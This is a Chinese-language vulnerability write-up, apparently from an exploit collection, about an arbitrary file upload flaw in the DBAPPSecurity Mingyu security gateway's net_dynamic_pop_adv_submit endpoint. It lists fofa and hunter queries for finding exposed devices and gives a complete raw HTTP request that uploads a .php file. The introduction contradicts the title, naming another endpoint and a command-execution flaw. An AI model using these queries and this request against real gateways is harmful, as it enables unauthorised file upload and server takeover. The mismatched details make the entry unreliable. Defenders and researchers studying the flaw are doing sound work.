# 安恒明御安全网关net_dynamic_pop_adv_submit存在任意文件上传漏洞

# 一、漏洞简介
安恒信息明御安全网关<font style="color:rgb(0, 0, 0);">（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、</font>入侵防御系统<font style="color:rgb(0, 0, 0);">、防病毒网关、上网行为管控、VPN网关、威胁情报等</font>安全模块<font style="color:rgb(0, 0, 0);">于一体的智慧化安全网关。安恒明御安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞。攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 安恒明御安全网关

# 三、资产测绘
+ hunter`app.name="安恒明御安全网关"`
+ fofa`title="明御安全网关"`
+ 特征

![1699939786628-0b13cd03-210c-4d73-9fb2-6198942e15c3.png](./img/HWXRZk-Pt7bBvocS/1699939786628-0b13cd03-210c-4d73-9fb2-6198942e15c3-137994.png)

# 四、漏洞复现
```plain
POST /webui/?g=net_dynamic_pop_adv_submit HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 196
Content-Type: multipart/form-data; boundary=qqobiandqgawlxodfiisporjwravxtvd

--qqobiandqgawlxodfiisporjwravxtvd
Content-Disposition: form-data; name="filename"; filename="9B9Ccd.php"
Content-Type: text/plain

2ZqGNnsjzzU2GBBPyd8AIA7QlDq
--qqobiandqgawlxodfiisporjwravxtvd--
```
